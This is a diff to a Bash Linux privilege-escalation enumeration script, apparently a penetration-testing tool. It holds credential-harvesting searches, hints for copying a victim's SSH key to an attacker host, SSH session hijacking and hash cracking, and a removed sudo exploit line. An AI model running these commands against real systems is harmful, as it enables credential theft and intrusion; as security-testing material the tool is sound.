@@ -378,6 +378,8 @@ echo -e "${RED} \t\t╔═══════════════════
 echo -e "${RED} \t\t ═══════════════════════════════════════[ Credentials Harvesting ]═══════════════════════════════════════ ${XX}"
 echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
 echo -e "\n"
+echo -e "\n${BLUE}╔═════{ List Files having password as string:${XX}"
+    grep "password" ~/*.txt
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║To list all files having the word password/credentials/hash do the following manually:                              ║"
         echo -e "\t║${RED}grep -rn -i 'pass\|cred\|hash' / --color=always > password.txt${XX}                                                      ║"
@@ -3144,9 +3146,8 @@ echo -e "\n${BLUE}╔═════{ System Version:${XX}"
 echo -e "\n${BLUE}╔═════{ Is sudo version vulnerable?${XX}"
     sudo -V | grep version
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║If the sudo version ${RED}<= v1.28${XX}, it is exploitable.                                                                    ║"
-        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
-        echo -e "\t║    sudo -u#-1 /bin/bash                                                                                            ║"
+        echo -e "\t║It is good to run sudokiller on the target system                                                                   ║"
+        echo -e "\t║https://github.com/TH3xACE/SUDO_KILLER.git                                                                          ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Available shells:${XX}"
     cat /etc/shells 2>/dev/null
@@ -3182,10 +3183,6 @@ echo -e "\n${BLUE}╔═════{ Linux File System Information:${XX}"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ List of running services:${XX}"
     service --status-all
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Run the following command to see whats running under systemctl:                                                     ║"
-        echo -e "\t║    systemctl list-units --type=service --all                                                                       ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ File-systems mounted:${XX}"
     df -h 2>/dev/null
 echo -e "\n${BLUE}╔═════{ Unmounted file-systems:${XX}"
@@ -3277,13 +3274,13 @@ echo -e "\n${BLUE}╔═════{ Is Ansible Installed on the system:${XX}"
                     echo -e "  ${RED}Playbooks does not exist${XX}"
             fi
             echo -e "\n${BLUE}    ══{ Ansible .yaml files:${XX}"
-                find / -name *.yaml -type f 2>/dev/null
+                find / -name '*.yaml' -type f 2>/dev/null
             echo -e "\n${BLUE}    ══{ Ansible .yaml files:${XX}"
-                find / -name *.yml -type f 2>/dev/null
+                find / -name '*.yml' -type f 2>/dev/null
             echo -e "\n${BLUE}    ══{ Crack Ansible Hash:${XX}"
                 echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                 echo -e "\t║Put the hash in ansible.yml file                                                                                    ║"
-                echo -e "\t║    python3 /usr/share/john/ansible2john.py ansible.yml                                                             ║"
+                echo -e "\t║    python3 /usr/share/john/ansible2john.py ./ansible.yml                                                           ║"
                 echo -e "\t║Copy and Past the text to ansible.txt file                                                                          ║"
                 echo -e "\t║    hashcat ansible.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt                                  ║"
                 echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
@@ -3658,14 +3655,11 @@ sleep 2
 echo -e "\n${BLUE}╔═════{ SSH is configured for Public Key Authentication:${XX}"
     if [ -f /etc/ssh/sshd_config ]; 
 	    then
-        echo -e "\n${BLUE}    ══{ PubkeyAuthentication:${XX}"
     	    cat /etc/ssh/sshd_config | grep 'PubkeyAuthentication' --color=always 
             echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-            echo -e "\t║is a method in which you generate and store on your computer a pair of cryptographic keys and then configure your   ║"
+            echo -e "\t║Is a method in which you generate and store on your computer a pair of cryptographic keys and then configure your   ║"
             echo -e "\t║server to recognize and accept your keys. A private key, usually named id_rsa, A public key, named id_rsa.pub       ║"
             echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-        echo -e "\n${BLUE}    ══{ Allowed Users :${XX}"
-            cat /etc/ssh/sshd_config | grep 'AllowUsers' --color=always 
         else
      		echo -e "${RED}	File does not exist${XX}"
     fi
@@ -3685,9 +3679,6 @@ find / -iname id_rsa 2>/dev/null
             echo -e "\t║    scp -P 22 username@v.v.v.v:/path/of/victim_rsa /path/to/attacker                                                ║"
             echo -e "\t║    chmod 0600 id_rsa                                                                                               ║"
             echo -e "\t║    ssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa                                                                      ║"
-            echo -e "\t║You can also convert the key into a crackable format:                                                               ║"
-            echo -e "\t║    ssh2john id_rsa > crack.txt                                                                                     ║"
-            echo -e "\t║    john --wordlist=/path/to/wordlist crack.txt                                                                     ║"
             echo -e "\t║Read More:                                                                                                          ║"
             echo -e "\t║    https://matt.might.net/articles/ssh-hacks/                                                                      ║"
             echo -e "\t║    https://book.hacktricks.xyz/pentesting/pentesting-ssh                                                           ║"
@@ -3758,13 +3749,11 @@ echo -e "\n${BLUE}╔═════{ Any active SSH session:${XX}"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If any session is found, the session can be hijacked. Read more about SSH session hijacking:                        ║"
         echo -e "\t║    https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                                       ║"
-        echo -e "\t║If any session is found, you can also use strace -p pid to spy on the child sshd process:                           ║"
-        echo -e "\t║    Ex: sudo strace -p 8408                                                                                         ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Active SSH Session ID:${XX}"
     pstree -p $USER | grep ssh
 echo -e "\n${BLUE}╔═════{ .key files:${XX}"
-    find / -name *.key -type f 2>/dev/null
+    find / -name '*.key' -type f 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Read the file and see if it has Proc-Type & DEK-Info which will indicate as an ssh key                              ║"
         echo -e "\t║Usage: ssh -i xyz.key username@ip/domain                                                                            ║"
@@ -3831,7 +3820,7 @@ echo -e "\n${BLUE}╔═════{ Tmp Directory:${XX}"
 echo -e "\n${BLUE}╔═════{ Backup Directory:${XX}"
     ls -la /var/backups 2>/dev/null && find / -type f  -iname *backup* -o -iname *.bak -o -iname *.bak* -o -iname *.bck -o -iname *.bk -o -iname *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
 echo -e "\n${BLUE}╔═════{ .bak Files:${XX}"
-    find / -iname *.bak -type f 2>/dev/null | grep --color "pass\|flag\|cred\|key\|hash\|shadow\|$"
+    find / -iname '*.bak' -type f 2>/dev/null | grep --color "pass\|flag\|cred\|key\|hash\|shadow\|$"
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Explore any interesting backup filename.                                                                      ║"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
@@ -3989,11 +3978,11 @@ echo -e "\n${BLUE}╔═════{ Tools/Languages Installed:${XX}"
         echo -e "\t║    https://gtfobins.github.io/                                                             ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Config Files:${XX}"
-    find / -iname *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
+    find / -iname '*.config' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
 echo -e "\n${BLUE}╔═════{ Bash Files:${XX}"
-    find / -iname *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/lib/\|/opt/firmware-mod-kit/\|/etc/console-setup/\|/etc/init.d/\|/etc/profile.d/\|/usr/share/"
+    find / -iname '*.sh' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/lib/\|/opt/firmware-mod-kit/\|/etc/console-setup/\|/etc/init.d/\|/etc/profile.d/\|/usr/share/"
 echo -e "\n${BLUE}╔═════{ Python Files:${XX}"
-    find / -iname *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share/\|/usr/bin/\|/usr/lib/\|/usr/share/\|/usr/local/\|/var/lib/\|/opt/firmware-mod-kit/\|/opt/xplico/\|/opt/lib/|"
+    find / -iname '*.py' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share/\|/usr/bin/\|/usr/lib/\|/usr/share/\|/usr/local/\|/var/lib/\|/opt/firmware-mod-kit/\|/opt/xplico/\|/opt/lib/|"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If the file is owned by root and can be executed by the current user, try to read it, maybe ║"
         echo -e "\t║the file can be exploitd by abusing it's library                                            ║"
@@ -4009,19 +3998,19 @@ echo -e "\n${BLUE}╔═════{ Any writable Python files:${XX}"
         echo -e "\t║    https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-friendzone/   ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ PHP Files 'Excluded /usr/ | /opt/':${XX}"
-    find / -iname *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
+    find / -iname "*.php" -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
 echo -e "\n${BLUE}╔═════{ Grep hardcoded passwords in *.php files:${XX}"
     find / -name "*.php" -print0 2>/dev/null | xargs -0 grep -i -n "var "$"password" --color=always
 echo -e "\n${BLUE}╔═════{ Text Files:${XX}"
-    find / -iname *.txt -type f 2>/dev/null | xargs ls -la 2>/dev/null | grep -v "/usr/\|/opt/\|/lib/\|/etc/" | grep --color "pass\|flag\|cred\|key\|hash\|shadow\|$"
+    find / -iname '*.txt' -type f 2>/dev/null | xargs ls -la 2>/dev/null | grep -v "/usr/\|/opt/\|/lib/\|/etc/" | grep --color "pass\|flag\|cred\|key\|hash\|shadow\|$"
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║smach2root search has excluded the following directory:-                       ║"
         echo -e "\t║  /usr/*       |  /opt/       |  /etc/                                         ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ HTML Files 'Excluded /usr/':${XX}"
-    find / -iname *.html -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.html' -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/"
 echo -e "\n${BLUE}╔═════{ .GPG Files:${XX}"
-    find / -iname *.gpg -type f 2>/dev/null | grep -v "/usr/\|/var/"
+    find / -iname '*.gpg' -type f 2>/dev/null | grep -v "/usr/\|/var/"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║A GPG file is a security key used to decrypt an encrypted file generated by GNU Privacy     ║"
         echo -e "\t║Guard (GnuPG), a file encryption program. The secure format is based on the OpenPGP         ║"
@@ -4032,14 +4021,14 @@ echo -e "\n${BLUE}╔═════{ .GPG Files:${XX}"
         echo -e "\t║     john hash -w=all                                                                       ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ .pyc Files:${XX}"
-    find / -iname *.pyc -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/\|/var/" 
+    find / -iname '*.pyc' -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/\|/var/" 
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Send the .pyc file to attacker PC and download uncompyle6 to decompile the file             ║"
         echo -e "\t║    uncompyle6 .pyc                                                                         ║"
         echo -e "\t║Try to understand how the file is writen and find out any possible way for PE               ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ KeePass database file:${XX}"
-    find / -name *.kdbx -o -name *.kdb -type f 2>/dev/null 2>/dev/null
+    find / -name '*.kdbx' -o -name *.kdb -type f 2>/dev/null 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║KeePass is a free open source password manager, which helps you to manage your passwords in ║"
         echo -e "\t║a secure way. You can store all your passwords in one database, which is locked with a      ║"
@@ -4050,22 +4039,22 @@ echo -e "\n${BLUE}╔═════{ KeePass database file:${XX}"
         echo -e "\t║    john hash                                                                               ║" 
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ .ZIP Files:${XX}"
-    find / -iname *.zip -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.zip' -type f 2>/dev/null | grep -v "/usr/"
 echo -e "\n${BLUE}╔═════{ .RAR Files:${XX}"
-    find / -iname *.rar -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.rar' -type f 2>/dev/null | grep -v "/usr/"
 echo -e "\n${BLUE}╔═════{ Image Files:${XX}"
     echo -e "\n${BLUE}    ══{ TIFF:${XX}"
-    find / -iname *.tif -type f 2>/dev/null | grep -v "/usr/"
-    find / -iname *.tif -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.tif' -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.tif' -type f 2>/dev/null | grep -v "/usr/"
     echo -e "\n${BLUE}    ══{ Bitmap:${XX}"
-    find / -iname *.bmp -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.bmp' -type f 2>/dev/null | grep -v "/usr/"
     echo -e "\n${BLUE}    ══{ JPEG:${XX}"
-    find / -iname *.jpg -type f 2>/dev/null | grep -v "/usr/"
-    find / -iname *.jpeg -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.jpg' -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.jpeg' -type f 2>/dev/null | grep -v "/usr/"
     echo -e "\n${BLUE}    ══{ GIF:${XX}"
-    find / -iname *.gif -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.gif' -type f 2>/dev/null | grep -v "/usr/"
     echo -e "\n${BLUE}    ══{ EPS:${XX}"
-    find / -iname *.eps -type f 2>/dev/null | grep -v "/usr/"
+    find / -iname '*.eps' -type f 2>/dev/null | grep -v "/usr/"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Use steganography tools and find out any hidden strings or usefull info.                    ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
@@ -4084,9 +4073,9 @@ echo -e "\n${BLUE}╔═════{ Current user trash files:${XX}"
             echo -e "${RED}	Trash is Empty${XX}"
     fi
 echo -e "\n${BLUE}╔═════{ Wireshark files:${XX}"
-    find / -name *.pcapng -o -name *.libpcap -type f 2>/dev/null | grep -v "/usr/"
+    find / -name '*.pcapng' -o -name *.libpcap -type f 2>/dev/null | grep -v "/usr/"
 echo -e "\n${BLUE}╔═════{ RDP Profiles:${XX}"
-    find / -name *.RDP -o -name *.rdp -type f 2>/dev/null
+    find / -name '*.RDP' -o -name *.rdp -type f 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Decode the RDP Password using Cain & Abel. So, open Cain & Adel the go to                   ║"
         echo -e "\t║    Tools > Remote Desktop Password Decoder $ then load the RDP profile to decode.          ║"
@@ -4110,7 +4099,7 @@ echo -e "\n${BLUE}╔═════{ Git Server Enumeration:${XX}"
 echo -e "\n${BLUE}╔═════{ Git User:${XX}"
     cat /etc/passwd | grep git-shell 2>/dev/null
 echo -e "\n${BLUE}╔═════{ OpenVPN Files:${XX}"
-    find / -iname *.ovpn -type f 2>/dev/null
+    find / -iname '*.ovpn' -type f 2>/dev/null
 echo -e "\n${BLUE}    ══{ auth.txt:${XX}"
     if [ -f /etc/openvpn/auth.txt ];
         then
@@ -4165,9 +4154,9 @@ echo -e "\n${BLUE}    ══{ ping:${XX}"
     read -p "    ══{ Do you want to scan target network using 'for loop'? [Y/N]:" input
         if [[ $input == "Y" || $input == "y" ]]; 
         then
-            read -p "Enter 1st octic : " O1
+            read -p "Enter 1st octic : " O1
             read -p "Enter 2nd octic : " O2
-            read -p "Enter 3rd octic : " O3
+            read -p "Enter 3rd octic : " O3
             echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
             echo -e "\t║This will scan all 255 IPs, and may take time based on the network range, please be patient. This will run normal   ║"
             echo -e "\t║for loop in our case.                                                                                               ║"
